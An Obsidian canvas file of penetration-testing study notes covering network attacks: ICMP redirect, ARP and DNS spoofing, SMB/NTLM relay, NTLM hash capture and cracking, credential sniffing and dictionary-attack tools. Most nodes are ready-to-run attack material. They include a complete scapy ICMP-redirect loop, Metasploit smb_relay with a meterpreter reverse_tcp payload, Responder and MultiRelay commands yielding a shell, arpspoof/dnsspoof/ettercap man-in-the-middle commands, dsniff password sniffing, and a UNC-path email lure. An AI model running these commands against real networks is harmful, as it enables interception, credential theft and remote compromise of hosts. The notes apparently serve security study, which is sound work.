{
	"nodes":[
		{"id":"941f61d00a5fe98c","type":"text","text":"# IP masquerading\n```\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE\n```","x":-989,"y":-620,"width":860,"height":180},
		{"id":"3467716f63cf018b","type":"text","text":"# Create an ICMP redirect script\nLaunch **scapy** and copy-paste the script content in **scapy** to launch the attack.\n\n```bash\n$ scapy\n...\noriginalRouterIP='10.100.13.1'\nattackerIP='10.100.13.20'\nvictimIP='10.100.13.126'\nserverIP='10.23.56.100'\n# We create an ICMP Redirect packet\nip=IP()\nip.src=originalRouterIP\nip.dst=victimIP\nicmpRedirect=ICMP()\nicmpRedirect.type=5\nicmpRedirect.code=1\nicmpRedirect.gw=attackerIP\n# The ICMP packet payload /should/ contain the original TCP SYN packet\n# sent from the victimIP\nredirPayloadIP=IP()\nredirPayloadIP.src=victimIP\nredirPayloadIP.dst=serverIP\nfakeOriginalTCPSYN=TCP()\nfakeOriginalTCPSYN.flags=\"S\"\nfakeOriginalTCPSYN.dport=80\nfakeOriginalTCPSYN.seq=444444444\nfakeOriginalTCPSYN.sport=55555\nwhile True:\n    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)\n```","x":-1085,"y":-1640,"width":1060,"height":840},
		{"id":"bd47b2f5fe05ed21","type":"text","text":"# SMB Relay Attack on NTLMv1/NTLMv2\n\n```mermaid\nsequenceDiagram\n\tparticipant NetworkHost\n\tparticipant Attacker\n\tparticipant TargetServer\n\n\tNote over Attacker: Attacker is MitM\n\tNote over Attacker:\twaits until someone in the network tries to authenticate to TargetServer\n\tNote over Attacker: Selects target\n\tNetworkHost ->> Attacker: Tries to authenticate\n\tAttacker ->> TargetServer: Send the authentication attempt\n\tTargetServer ->> Attacker: Sends the challenge\n\tAttacker ->> NetworkHost: Sends the challenge received from target server\n\tNote over NetworkHost: Encrypts challenge with password hash\n\tNetworkHost ->> Attacker: Sends encrypted challenge\n\tAttacker ->> TargetServer: Send the challenge and authenticate itself\n```\n\n## $ msf > smb_relay\n```bash\nmsfconsole\nuse exploit/windows/smb/smb_relay\nset SRVHOST 172.16.5.101\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 172.16.5.101\nset SMBHOST 172.16.5.10\nexploit\n```\n## $ impacket_smbrelayx\n```bash\n$ impacket-smbrelayx -h <TargetServerIP> [-e <file>] # SMB relay attack when MitM, [execute <file>(msfvenom payload)] \n```","x":-4040,"y":-102,"width":1120,"height":1277},
		{"id":"079b010d2ddec0b0","type":"text","text":"# Capture the client response (Type 3 message) in LM, NTLMv1  authentication protocols.\n\n```mermaid\nsequenceDiagram\n    Note over FakeServer: Fake server <br>with a fixed challenge (1122334455667788)<br>created by Attacker<br>using Metasploit module: auxiliary/server/capture/smb\n\n\tFakeServer ->> Client: OPTIONAL<br>Atacker use SMB authentication<br>to force the client to connect to the fake server.<br>mail with <img src=\"\\\\192.168.102.147\\ADMIN$\">\n\n    Client ->> FakeServer: Connection request (SMB authentication)\n\n    Note over FakeServer: Metasploit SMB listener with fixed challenge<br>$ msf> capture/smb\n\n    FakeServer ->> Client: Challenge 1122334455667788\n\n    Client ->> FakeServer: Encrypted challenge using LM/NTLMv1 hash (Type 3 message)\n\n    Note over FakeServer: Capturing client response with LMHASH and NTHASH\n\n\tNote over FakeServer: Cracking hashes using rainbow tables or other tools\n\n```\n\n### Summary:\n\n1. **Objective:** Capture the client response (Type 3 message) in LM and NTLMv1 authentication protocols.\n    \n2. **Methods:**\n    \n    - **Option 1:** Force the client to initiate a connection to a fake server.\n    - **Option 2:** Use Man-in-the-Middle techniques to sniff the client response.\n3. **Exploitation Process:**\n    \n    - Set up a listening SMB service (e.g., Metasploit module) on a fake server with a fixed challenge (1122334455667788).\n    - Use SMB authentication to force the client to connect to the fake server.\n    - Capture the client's encrypted response, including LMHASH and NTHASH.\n    - Do not forget to set Metasploit to automaticaly save the hashes to file.\n    \n1. **Tools:**\n    \n    - Metasploit module: auxiliary/server/capture/smb\n5. **Hash Cracking:**\n    \n    - Use rainbow tables for the fixed 8-byte server challenge (1122334455667788).\n    - No timestamp or nonce in Type 3 message allows the use of rainbow tables.\n6. **Initiating NTLM Protocol:**\n    \n    - Embed Universal Naming Convention (UNC) path (\\SERVER_IP\\SHARE) in an email or web page to force SMB authentication.\n7. **Observations:**\n    \n    - Challenge response remains the same for every connection due to the fixed challenge.\n    - LMHASH and NTHASH represent client response; differences indicate LM or NT hashes in use.\n    - Passwords â‰¤ 7 characters result in the last 8 bytes of NTLM response always being **2f85252cc731bb25**.\n8. **Cracking Hashes:**\n    \n    - Utilize various tools (online/offline) for cracking captured hashes.\n    - Credentials saved by Metasploit for use with tools like John the Ripper.\n9. **Important Note:**\n    \n    - LM and NTLMv1 protocols' randomness is defeated using the crafted challenge 1122334455667788, demonstrating a lack of true randomness in the protocol.","x":-5300,"y":-102,"width":1260,"height":1780},
		{"id":"78eaecc26eede31d","type":"text","text":"# Cracking captured LM hashes using rainbow tables or other tools\n```bash\n$ cat hashes # file containing captured hashes from $ msf> capture/smb\n$ cd halflmhash # go to folder with rainbow tables\n$ sudo rcrack_mt -h <8 bytes of LM HASH> -t 4 *.rti # rainbowcrack captured lmhash (8bytes= 16 first chars) using all rainbow tables  \n# rcrack returns plaintext of part of hash\n$ sudo perl netntlm --file <path/to/hashhes_file> --seed <found_plaintext_of_found_hash> # cracks full password, returns password in full uppercase\n$ sudo perl netntlm --file <path/to/hashhes_file> --seed <found_uppercase_password> # returns case sensitive password\n```","x":-5300,"y":1760,"width":1260,"height":360},
		{"id":"2cab20fba228e1fe","type":"text","text":"# driftnet\nWhen MitM (`$ apr-spoof...`) attack is running it sniffs for images, etc. \n```bash\n$ driftnet -i eth1\n```","x":-1108,"y":1498,"width":600,"height":240},
		{"id":"4ab77513f7caac80","type":"text","text":"# $ Cain&Abel\nGraphical tool for windows.","x":-1102,"y":1760,"width":358,"height":120},
		{"id":"11c64446576e039f","type":"text","text":"# $ dsniff (password sniff)\nWhen MitM (`$ apr-spoof...`) attack is running it sniffs for creds, etc. \n```bash\n$ dsniff -i <interface> \n```\n","x":-1102,"y":1933,"width":666,"height":187},
		{"id":"ec744eb6e636f2ad","type":"text","text":"# (OSI/ISO 2 Layer - Data Link)","x":-191,"y":359,"width":543,"height":60,"color":"2"},
		{"id":"818c9f6aef87c70d","type":"text","text":" SMB relay attack focuses on relaying SMB traffic, which is a broader concept, while an NTLM relay attack specifically targets the NTLM authentication process within the SMB protocol.","x":-2519,"y":1034,"width":578,"height":141,"color":"5"},
		{"id":"df93168a3d16a910","type":"text","text":"# NTLM Relay Attack","x":-2369,"y":1468,"width":419,"height":60,"color":"1"},
		{"id":"7d222a476c0674e1","type":"text","text":"# $ responder (NTLMv1/NTLMv2 sniff)\n\nResponder is a sniffing tool used **to gain vulnerable credentials from network traffic, including those sent over SMB, HTTP, and other protocols**. Responder is also an LLMNR, NBT-NS, and MDNS poisoner.\n\n```bash\n$ responder -I <Iface> #Default conf\n$ responder -I <Iface> --lm #Default conf, attempt to downgrade NTLM hashes to LM hashes\n$ responder -I <Iface> -P -r -v #More chances but might break things\n```\n# additional tools \n/usr/share/responder/tools\nAdditional scripts \n* `Runfinger.py` check if `SMB signing` hash been disabled on attacked station. (Required for attack to work)\n* `MultiRelay.py`\n## Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks\n","x":-2465,"y":1866,"width":915,"height":929},
		{"id":"a334523800d7e56c","type":"text","text":"Prerequisits:\nNetBIOS Name Service and Link Local Multicast Name Resolution are used in network\nand SMB signing is disabled","x":-3027,"y":1440,"width":589,"height":237},
		{"id":"d68e967dd4f0e259","type":"text","text":"# $ responder + $ multirelay for NTLM relay attack\n```bash\n# disable smb and http service\n$ nano /usr/share/responder/Responder.conf # conf file for responder\n# responder will not work as fake smb/http server\n# it will only poison NBT-NS/LLMNR and becomes MitM\n```\n```bash\n$ responder -I <interface> --lm # run resonder as relay with downgrade ntlm to lm\n```\n```bash\n# target specific host in network with multirelay\n$ cd /usr/share/responder/tools\n$ /MultiRelay.py -t <targetIP> -u ALL # relay ALL users\n```\n```bash\n# gets multirelay shel: upload, download files,...\n```","x":-3108,"y":1866,"width":643,"height":700},
		{"id":"a0e038b2338d85b0","type":"text","text":"# SMB Relay Attack","x":-2160,"y":238,"width":358,"height":60,"color":"1"},
		{"id":"2c75577749f6adb5","type":"text","text":"Allow the attacker to re-use authentication attempts in order to gain access to a system in the network\n\n* Attack works only if the **user**, who is trying to authenticate on the target machine,** has administrative privileges on the target**.\n* Attack will only work if the target machines has the \"**Network security: LAN Manager authentication level\" set to \"Send LM & NTLM responses\"**.\n\nTo defend against SMB relay attacks, organizations can use security mechanisms like SMB signing, which adds a digital signature to SMB packets, making them harder to tamper with.","x":-1941,"y":298,"width":500,"height":500},
		{"id":"c50e64cd9b423ed0","type":"text","text":"## $ arpspoof (spoof)\n**arpspoof** redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.  \nhttps://www.geeksforgeeks.org/ssl-stripping-and-arp-spoofing-in-kali-linux/\n```bash\n$ arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host\n\n# Turn on the packet forwarding in Linux\n# By enabling the packet forwarding, you disguise your local machine to act as the network router.\n$ sysctl -w net.ipv4.ip_forward=1\n$ echo '1' > /proc/sys/net/ipv4/ip_forward # enable packet forwarding, IP forwarding\n\n$ arpspoof [-i <Network_Interface_Name>] [-t <target_IP>] [-r <impersonated_IP>] # ARP spoofing / MitM attack (remeber to turn on IP forwarding)\n\n# Stopping the attack\n# kill arpspoof proceses and\n# Turn off the packet forwarding in Linux\n$ sysctl -w net.ipv4.ip_forward=0\n$ echo '0' > /proc/sys/net/ipv4/ip_forward # disable packet forwarding, IP forwarding\n```\n","x":60,"y":1098,"width":1085,"height":615},
		{"id":"23ac073d993d561a","type":"text","text":"## $ msf - arp_poisoning (arp spoof)\n```bash\nmsf> auxiliary/spoof/arp/arp_poisoning\nset DHOSTS *IP address of the attacked system*\nset SHOSTS *IP address of the gateway*\n```\n","x":60,"y":1738,"width":1085,"height":240},
		{"id":"9d539e36cd67c5dc","type":"text","text":"## $ bettercap (spoof + sniff)\n```bash\n$ bettercap [-I eth0] # default spoofing attack against all hosts\n$ bettercap [-I eth0] --no-spoofing # discovery devices in network, network sniffing, Mitm attack \n$ bettercap [-I eth0] -T <target_IP> # ARP spoofing attack against host, MitM attack\n$ bettercap [-I eth0] -X  -T <target_IP> -G <gateway_IP># default spoofing attack against all hosts with sniffing, Mitm attack\n```\n\n## $ ettercap (spoof + sniff)\n\n```bash\n$ ettercap -G # run ettercap, graphic mode\n$ ettercap -T -M [-i eth0] [-L </tmp/logfile>] <IP1> [<IP2>] # MitM attack and sniff connection\n```\n","x":135,"y":594,"width":1085,"height":440},
		{"id":"dacf7e22c12bd102","type":"text","text":"# $ hydra","x":-3131,"y":-1254,"width":309,"height":116},
		{"id":"b0ab2164e2f4cccf","type":"text","text":"# $ cewl\nscrape a target organizationâ€™s website for keywords, and in turn, will generate a list of words we can use for wordlist generator\n```bash\n$ cewl -m 8 http://www.google.com # words min 8 char len\n```","x":-4349,"y":-1250,"width":648,"height":213},
		{"id":"045f441a3dea057e","type":"text","text":"# Wordlist generators","x":-3872,"y":-838,"width":376,"height":94},
		{"id":"67cf75a3bc300117","type":"text","text":"# dictionary attacks","x":-3273,"y":-791,"width":368,"height":94},
		{"id":"03985552d7697116","type":"text","text":"# $ medusa","x":-2895,"y":-1067,"width":250,"height":60},
		{"id":"817501f55fc904f9","type":"text","text":"# $ ncrack\nhttps://github.com/nmap/ncrack\nNOT MAINTAINED, MOST OF IT FEATURES CONVERTED TO NMAP SCRIPTS (BRUTE CATEGORY)","x":-2825,"y":-838,"width":360,"height":233},
		{"id":"210a8ca127411188","type":"text","text":"# Dictionary attacks","x":-3027,"y":-440,"width":368,"height":82,"color":"1"},
		{"id":"6d36d6896a43ba9a","type":"text","text":"# $ mentalist\nhttps://github.com/sc0tfree/mentalist\ngraphical tool for custom wordlist generation","x":-4903,"y":-1591,"width":467,"height":246},
		{"id":"ea40abf07ea9405f","type":"text","text":"# $ rsmangler\n```bash\n$ cat wordls.txt\n\trobot\n\tLLC\n\tIndustries\n$ cat words.txt | rsmangler --file - > words_new.txt\n```","x":-3836,"y":-1591,"width":681,"height":262},
		{"id":"43e8f4b2e8280262","type":"text","text":"# Man in the Middle","x":-1691,"y":-40,"width":513,"height":180,"color":"1"},
		{"id":"26957af29410c064","type":"text","text":"In this type of an attack, the hacker, posing as a router, sends an Internet Control Message Protocol (ICMP) redirect message to a host, which **indicates that all future traffic must be directed to a specific system as the more optimal route for the destination**.","x":-1941,"y":-474,"width":627,"height":150},
		{"id":"e5e267f1a2607c99","type":"text","text":"# ICMP Redirect Attack","x":-1514,"y":-333,"width":400,"height":80,"color":"1"},
		{"id":"606b2f30486cd716","type":"text","text":"attack in which the attacker secretly intercepts and relays messages between two parties","x":-1627,"y":140,"width":459,"height":96},
		{"id":"5ddf9942d689a264","type":"text","text":"# DNS Spoof","x":-989,"y":268,"width":358,"height":60,"color":"1"},
		{"id":"a4f2950e922368f4","type":"text","text":"# $ dnsspoof\nDrops DNS responses before they hit the router then replaces them with the spoofed DNS response.\n\n\n\n```bash\n# use in conjunction with `$ arp-spoof`\n$ echo \"172.16.5.101 *.sportsfoo.com\" > dns\n$ dnsspoof -i eth1 -f dns\n```\nhttps://my.ine.com/INE/courses/26e04354-3a80-454c-9b97-10a71071bb79/penetration-testing-network-security/lab/aaac6401-58a8-4f3c-b7f9-3f2a4fedda23\n\n","x":-1008,"y":419,"width":500,"height":421},
		{"id":"981fd982fe75cf98","type":"text","text":"#  (OSI/ISO 3 Layer - Network)","x":-1284,"y":1240,"width":526,"height":83,"color":"2"},
		{"id":"8f4a37fde6ed251a","type":"text","text":"# $ tcpdump\n```bash\n$ tcpdump\n```","x":352,"y":-333,"width":325,"height":150},
		{"id":"43d92380d74517f2","type":"text","text":"# Sniffing","x":-441,"y":-258,"width":250,"height":70,"color":"1"},
		{"id":"08d42d1c5608a4ea","type":"text","text":"# $ p0f\n```bash\n$ p0f -i <interface> # passive OS detection\n```","x":60,"y":-120,"width":520,"height":160}
	],
	"edges":[
		{"id":"09ef996c716a3105","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"43d92380d74517f2","toSide":"left"},
		{"id":"eec5229297e8fe8b","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"ec744eb6e636f2ad","toSide":"top"},
		{"id":"9c941e1e0e6931ce","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"9d539e36cd67c5dc","toSide":"top"},
		{"id":"b6606681e17e80bc","fromNode":"43d92380d74517f2","fromSide":"right","toNode":"08d42d1c5608a4ea","toSide":"top"},
		{"id":"51af2e00f342b22f","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"981fd982fe75cf98","toSide":"top"},
		{"id":"93ef1f3cfa0e3957","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"11c64446576e039f","toSide":"left"},
		{"id":"fcdb5facda76e850","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"4ab77513f7caac80","toSide":"left"},
		{"id":"592c50c6c39776c2","fromNode":"981fd982fe75cf98","fromSide":"bottom","toNode":"2cab20fba228e1fe","toSide":"top"},
		{"id":"6e987eaf9ece3cc1","fromNode":"981fd982fe75cf98","fromSide":"left","toNode":"7d222a476c0674e1","toSide":"right"},
		{"id":"b0a409d190d8a619","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"981fd982fe75cf98","toSide":"top"},
		{"id":"bcc6b24188a3ede0","fromNode":"e5e267f1a2607c99","fromSide":"top","toNode":"941f61d00a5fe98c","toSide":"bottom"},
		{"id":"d7db991d1aff38b6","fromNode":"941f61d00a5fe98c","fromSide":"top","toNode":"3467716f63cf018b","toSide":"bottom"},
		{"id":"0f75eda25abf26e5","fromNode":"43e8f4b2e8280262","fromSide":"top","toNode":"e5e267f1a2607c99","toSide":"bottom"},
		{"id":"1bda106e17588645","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"dacf7e22c12bd102","toSide":"bottom"},
		{"id":"0c737c74f1f21111","fromNode":"210a8ca127411188","fromSide":"left","toNode":"045f441a3dea057e","toSide":"right"},
		{"id":"0fd2037907a482b5","fromNode":"045f441a3dea057e","fromSide":"top","toNode":"ea40abf07ea9405f","toSide":"bottom"},
		{"id":"d12eeb13e36bef82","fromNode":"045f441a3dea057e","fromSide":"top","toNode":"b0ab2164e2f4cccf","toSide":"bottom"},
		{"id":"ae03d8b3744bb8cc","fromNode":"210a8ca127411188","fromSide":"top","toNode":"67cf75a3bc300117","toSide":"bottom"},
		{"id":"fd676a2962b1d5fa","fromNode":"b0ab2164e2f4cccf","fromSide":"right","toNode":"ea40abf07ea9405f","toSide":"bottom"},
		{"id":"ed9ff034ea329291","fromNode":"b0ab2164e2f4cccf","fromSide":"top","toNode":"6d36d6896a43ba9a","toSide":"bottom"},
		{"id":"06249943e789d6d4","fromNode":"045f441a3dea057e","fromSide":"left","toNode":"6d36d6896a43ba9a","toSide":"bottom"},
		{"id":"f281432268e8586e","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"817501f55fc904f9","toSide":"left"},
		{"id":"8615219be37b4039","fromNode":"67cf75a3bc300117","fromSide":"top","toNode":"03985552d7697116","toSide":"bottom"},
		{"id":"884f9558c525998a","fromNode":"a0e038b2338d85b0","fromSide":"right","toNode":"43e8f4b2e8280262","toSide":"left"},
		{"id":"01785c068e4d3083","fromNode":"a0e038b2338d85b0","fromSide":"left","toNode":"bd47b2f5fe05ed21","toSide":"right"},
		{"id":"3e8e4af071286594","fromNode":"079b010d2ddec0b0","fromSide":"bottom","toNode":"78eaecc26eede31d","toSide":"top"},
		{"id":"6cd9b92fb3a2a760","fromNode":"df93168a3d16a910","fromSide":"bottom","toNode":"7d222a476c0674e1","toSide":"top"},
		{"id":"1d65626c1d354f28","fromNode":"a0e038b2338d85b0","fromSide":"bottom","toNode":"818c9f6aef87c70d","toSide":"top"},
		{"id":"9ced5a9550747f52","fromNode":"df93168a3d16a910","fromSide":"top","toNode":"818c9f6aef87c70d","toSide":"bottom"},
		{"id":"05c86c97dc93b18b","fromNode":"df93168a3d16a910","fromSide":"bottom","toNode":"d68e967dd4f0e259","toSide":"top"},
		{"id":"1d60fcf7ee1f24ce","fromNode":"43e8f4b2e8280262","fromSide":"right","toNode":"5ddf9942d689a264","toSide":"top"},
		{"id":"1f2fbbe01a4aa9e0","fromNode":"5ddf9942d689a264","fromSide":"bottom","toNode":"a4f2950e922368f4","toSide":"top"},
		{"id":"dc7896ee933d44c8","fromNode":"ec744eb6e636f2ad","fromSide":"bottom","toNode":"c50e64cd9b423ed0","toSide":"left"},
		{"id":"324fedf2fe1069f6","fromNode":"43d92380d74517f2","fromSide":"right","toNode":"8f4a37fde6ed251a","toSide":"top"}
	]
}